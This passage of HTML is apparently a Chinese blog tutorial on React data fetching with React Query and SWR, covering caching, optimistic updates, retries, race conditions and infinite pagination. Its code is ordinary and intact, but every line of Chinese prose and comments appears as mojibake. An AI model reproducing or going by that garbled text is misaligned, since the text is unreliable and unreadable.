class_">QueryClient</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">QueryClientProvider</span> <span class="hljs-attr">client</span>=<span class="hljs-string">&#123;queryClient&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">QueryClientProvider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// æŸ¥è¯¢ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, isLoading, isError, error &#125; = <span class="hljs-title function_">useQuery</span>(<br>    <span class="hljs-string">&#x27;userData&#x27;</span>, <br>    <span class="hljs-function">() =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/users/123&#x27;</span>),<br>    &#123;<br>      <span class="hljs-attr">staleTime</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// 5åˆ†é’Ÿä¿é²œæœŸ</span><br>      <span class="hljs-attr">retry</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// å¤±è´¥é‡è¯•æ¬¡æ•°</span><br>      <span class="hljs-attr">refetchOnWindowFocus</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// çª—å£èšç„¦æ—¶é‡æ–°è·å–</span><br>    &#125;<br>  );<br><br>  <span class="hljs-comment">// çªå˜ç¤ºä¾‹</span><br>  <span class="hljs-keyword">const</span> updateUser = <span class="hljs-title function_">useMutation</span>(<br>    <span class="hljs-function">(<span class="hljs-params">newData</span>) =&gt;</span> api.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/users/123&#x27;</span>, newData),<br>    &#123;<br>      <span class="hljs-attr">onSuccess</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-comment">// æ›´æ–°æˆåŠŸåé‡æ–°è·å–ç”¨æˆ·æ•°æ®</span><br>        queryClient.<span class="hljs-title function_">invalidateQueries</span>(<span class="hljs-string">&#x27;userData&#x27;</span>);<br>      &#125;,<br>      <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>        toast.<span class="hljs-title function_">error</span>(<span class="hljs-string">`æ›´æ–°å¤±è´¥: <span class="hljs-subst">$&#123;error.message&#125;</span>`</span>);<br>      &#125;<br>    &#125;<br>  );<br><br>  <span class="hljs-keyword">if</span> (isLoading) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>;<br>  <span class="hljs-keyword">if</span> (isError) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Error</span> <span class="hljs-attr">message</span>=<span class="hljs-string">&#123;error.message&#125;</span> /&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;data.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> updateUser.mutate(&#123; name: &#x27;æ–°åå­—&#x27; &#125;)&#125;&gt;</span><br><span class="language-xml">        æ›´æ–°ç”¨æˆ·</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ul><li>æ™ºèƒ½ç¼“å­˜ï¼šè‡ªåŠ¨ç®¡ç†è¯·æ±‚ç¼“å­˜</li><li>åå°åˆ·æ–°ï¼šæ•°æ®è¿‡æœŸæ—¶åœ¨åå°æ›´æ–°</li><li>åˆ†é¡µæŸ¥è¯¢ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; data, fetchNextPage &#125; = <span class="hljs-title function_">useInfiniteQuery</span>(<br>  <span class="hljs-string">&#x27;projects&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">&#123; pageParam = <span class="hljs-number">1</span> &#125;</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/projects?page=<span class="hljs-subst">$&#123;pageParam&#125;</span>`</span>),<br>  &#123;<br>    <span class="hljs-attr">getNextPageParam</span>: <span class="hljs-function">(<span class="hljs-params">lastPage</span>) =&gt;</span> lastPage.<span class="hljs-property">nextPage</span><br>  &#125;<br>);<br></code></pre></td></tr></table></figure><p><strong>SWR æ ¸å¿ƒåº”ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> useSWR <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;swr&#x27;</span>;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ fetcher</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetcher</span> = (<span class="hljs-params">...args</span>) =&gt; <span class="hljs-title function_">fetch</span>(...args).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; data, error, mutate &#125; = <span class="hljs-title function_">useSWR</span>(<br>    <span class="hljs-string">&#x27;/api/user/123&#x27;</span>, <br>    fetcher,<br>    &#123;<br>      <span class="hljs-attr">revalidateOnFocus</span>: <span class="hljs-literal">false</span>,<br>      <span class="hljs-attr">refreshInterval</span>: <span class="hljs-number">60000</span>, <span class="hljs-comment">// 60ç§’åˆ·æ–°ä¸€æ¬¡</span><br>      <span class="hljs-attr">onErrorRetry</span>: <span class="hljs-function">(<span class="hljs-params">error, key, config, revalidate, &#123; retryCount &#125;</span>) =&gt;</span> &#123;<br>        <span class="hljs-comment">// 404é”™è¯¯ä¸é‡è¯•</span><br>        <span class="hljs-keyword">if</span> (error.<span class="hljs-property">status</span> === <span class="hljs-number">404</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">// 10ç§’åé‡è¯•</span><br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">revalidate</span>(&#123; retryCount &#125;), <span class="hljs-number">10000</span>);<br>      &#125;<br>    &#125;<br>  );<br><br>  <span class="hljs-comment">// ä¹è§‚æ›´æ–°</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">newName</span>) =&gt; &#123;<br>    <span class="hljs-comment">// ç«‹å³æ›´æ–°æœ¬åœ°æ•°æ®</span><br>    <span class="hljs-title function_">mutate</span>(&#123; ...data, <span class="hljs-attr">name</span>: newName &#125;, <span class="hljs-literal">false</span>);<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">patch</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>, &#123; <span class="hljs-attr">name</span>: newName &#125;);<br>      <span class="hljs-comment">// é‡æ–°éªŒè¯ç¡®ä¿æ•°æ®æœ€æ–°</span><br>      <span class="hljs-title function_">mutate</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-comment">// å‡ºé”™æ—¶å›æ»š</span><br>      <span class="hljs-title function_">mutate</span>(data, <span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;data ? <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;data.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span> : &#x27;Loading...&#x27;&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> updateName(&#x27;New Name&#x27;)&#125;&gt;</span><br><span class="language-xml">        æ›´æ–°åå­—</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ul><li>è¯·æ±‚å»é‡ï¼šè‡ªåŠ¨é¿å…é‡å¤è¯·æ±‚</li><li>ä¾èµ–è¯·æ±‚ï¼šåŸºäºæ•°æ®ä¾èµ–çš„è¯·æ±‚é“¾</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: user &#125; = <span class="hljs-title function_">useSWR</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>, fetcher);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">data</span>: projects &#125; = <span class="hljs-title function_">useSWR</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-string">`/api/projects?userId=<span class="hljs-subst">$&#123;user.id&#125;</span>`</span>, <br>  fetcher<br>);<br></code></pre></td></tr></table></figure><ul><li>SSR æ”¯æŒï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetcher</span>(<span class="hljs-string">&#x27;/api/user/123&#x27;</span>);<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">fallback</span>: &#123; <span class="hljs-string">&#x27;/api/user/123&#x27;</span>: user &#125; &#125; &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">&#123; fallback &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SWRConfig</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">fallback</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Profile</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SWRConfig</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜çº§æ•°æ®ç®¡ç†ç­–ç•¥"><a href="#é«˜çº§æ•°æ®ç®¡ç†ç­–ç•¥" class="headerlink" title="é«˜çº§æ•°æ®ç®¡ç†ç­–ç•¥"></a>é«˜çº§æ•°æ®ç®¡ç†ç­–ç•¥</h3><p><strong>è¯·æ±‚çŠ¶æ€ç»Ÿä¸€ç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å°è£… useApi é’©å­</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useApi</span> = (<span class="hljs-params">key, fn, options = &#123;&#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [status, setStatus] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;idle&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> (params) =&gt; &#123;<br>    <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;pending&#x27;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>(params);<br>      <span class="hljs-title function_">setData</span>(result);<br>      <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;success&#x27;</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-title function_">setError</span>(err);<br>      <span class="hljs-title function_">setStatus</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>      <span class="hljs-keyword">throw</span> err;<br>    &#125;<br>  &#125;, [fn]);<br><br>  <span class="hljs-keyword">return</span> &#123;<br>    status,  <span class="hljs-comment">// &#x27;idle&#x27; | &#x27;pending&#x27; | &#x27;success&#x27; | &#x27;error&#x27;</span><br>    data,<br>    error,<br>    execute,<br>    <span class="hljs-attr">isLoading</span>: status === <span class="hljs-string">&#x27;pending&#x27;</span>,<br>    <span class="hljs-attr">isError</span>: status === <span class="hljs-string">&#x27;error&#x27;</span><br>  &#125;;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> &#123; data, status, <span class="hljs-attr">execute</span>: fetchUser &#125; = <span class="hljs-title function_">useApi</span>(<br>  <span class="hljs-string">&#x27;userData&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">userId</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>)<br>);<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®ç¼“å­˜ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ React Query çš„ç¼“å­˜å·¥å…·</span><br><span class="hljs-keyword">const</span> queryClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryClient</span>(&#123;<br>  <span class="hljs-attr">defaultOptions</span>: &#123;<br>    <span class="hljs-attr">queries</span>: &#123;<br>      <span class="hljs-attr">cacheTime</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>, <span class="hljs-comment">// 15åˆ†é’Ÿç¼“å­˜</span><br>      <span class="hljs-attr">staleTime</span>: <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,  <span class="hljs-comment">// 5åˆ†é’Ÿä¿é²œ</span><br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// æ‰‹åŠ¨ç®¡ç†ç¼“å­˜</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">updateCache</span> = (<span class="hljs-params">newUser</span>) =&gt; &#123;<br>  queryClient.<span class="hljs-title function_">setQueryData</span>([<span class="hljs-string">&#x27;user&#x27;</span>, newUser.<span class="hljs-property">id</span>], newUser);<br>  <br>  <span class="hljs-comment">// æ›´æ–°åˆ—è¡¨ç¼“å­˜</span><br>  queryClient.<span class="hljs-title function_">setQueryData</span>([<span class="hljs-string">&#x27;users&#x27;</span>], <span class="hljs-function">(<span class="hljs-params">old</span>) =&gt;</span> <br>    old.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">id</span> === newUser.<span class="hljs-property">id</span> ? newUser : user)<br>  );<br>&#125;;<br><br><span class="hljs-comment">// SWR å…¨å±€é…ç½®</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SWRConfig</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    <span class="hljs-attr">provider:</span> () =&gt;</span> new Map(),</span><br><span class="language-xml">    isOnline() &#123;</span><br><span class="language-xml">      // è‡ªå®šä¹‰ç½‘ç»œçŠ¶æ€æ£€æµ‹</span><br><span class="language-xml">      return navigator.onLine;</span><br><span class="language-xml">    &#125;</span><br><span class="language-xml">  &#125;&#125;</span><br><span class="language-xml">&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">SWRConfig</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ-1"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ-1" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ"></a>é¢è¯•é«˜é¢‘é—®é¢˜è§£å†³æ–¹æ¡ˆ</h3><p><strong>è¯·æ±‚ç«æ€é—®é¢˜ï¼ˆRace Conditionï¼‰</strong></p><p>é—®é¢˜ï¼šå¿«é€Ÿåˆ‡æ¢å‚æ•°å¯¼è‡´æ—§è¯·æ±‚è¦†ç›–æ–°å“åº”</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> isActive = <span class="hljs-literal">true</span>;<br>    <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>);<br>    <br>    api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setData</span>(res.<span class="hljs-property">data</span>);<br>      &#125;)<br>      .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (isActive) <span class="hljs-title function_">setError</span>(err);<br>      &#125;);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; isActive = <span class="hljs-literal">false</span>; &#125;;<br>  &#125;, [userId]);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¯·æ±‚é‡è¯•ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Query æŒ‡æ•°é€€é¿é‡è¯•</span><br><span class="hljs-title function_">useQuery</span>(<span class="hljs-string">&#x27;todos&#x27;</span>, fetchTodos, &#123;<br>  <span class="hljs-attr">retry</span>: <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">retryDelay</span>: <span class="hljs-function">(<span class="hljs-params">attemptIndex</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">1000</span> * <span class="hljs-number">2</span> ** attemptIndex, <span class="hljs-number">30000</span>)<br>&#125;);<br><br><span class="hljs-comment">// Axios æ‹¦æˆªå™¨é‡è¯•</span><br>api.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-literal">null</span>, <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> config = error.<span class="hljs-property">config</span>;<br>  <span class="hljs-keyword">if</span> (!config || !config.<span class="hljs-property">retry</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  <br>  config.<span class="hljs-property">retryCount</span> = config.<span class="hljs-property">retryCount</span> || <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">retryCount</span> &gt;= config.<span class="hljs-property">retry</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>  &#125;<br>  <br>  config.<span class="hljs-property">retryCount</span> += <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">api</span>(config)), config.<span class="hljs-property">retryDelay</span> || <span class="hljs-number">1000</span>)<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å¤§æ•°æ®é‡åˆ†é¡µä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Query æ— é™åŠ è½½</span><br><span class="hljs-keyword">const</span> &#123; data, fetchNextPage, hasNextPage &#125; = <span class="hljs-title function_">useInfiniteQuery</span>(<br>  <span class="hljs-string">&#x27;projects&#x27;</span>,<br>  <span class="hljs-function">(<span class="hljs-params">&#123; pageParam = <span class="hljs-number">0</span> &#125;</span>) =&gt;</span> api.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/projects?offset=<span class="hljs-subst">$&#123;pageParam&#125;</span>&amp;limit=20`</span>),<br>  &#123;<br>    <span class="hljs-attr">getNextPageParam</span>: <span class="hljs-function">(<span class="hljs-params">lastPage</span>) =&gt;</span> <br>      lastPage.<span class="hljs-property">hasMore</span> ? lastPage.<span class="hljs-property">nextOffset</span> : <span class="hljs-literal">undefined</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// è™šæ‹Ÿåˆ—è¡¨æ¸²æŸ“</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FixedSizeList</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-window&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProjectList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FixedSizeList</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemCount</span>=<span class="hljs-string">&#123;data?.pages.flat().length</span> || <span class="hljs-attr">0</span>&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">itemSize</span>=<span class="hljs-string">&#123;100&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      &#123;(&#123; index, style &#125;) =&gt; &#123;</span><br><span class="language-xml">        const item = data.pages.flat()[index];</span><br><span class="language-xml">        return (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProjectItem</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;item&#125;</span> /&gt;</span></span><br><span class="language-xml">            &#123;index === data.pages.flat().length - 1 &amp;&amp; hasNextPage &amp;&amp; (</span><br><span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;fetchNextPage&#125;</span>&gt;</span>åŠ è½½æ›´å¤š<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">            )&#125;</span><br><span class="language-xml">          <span 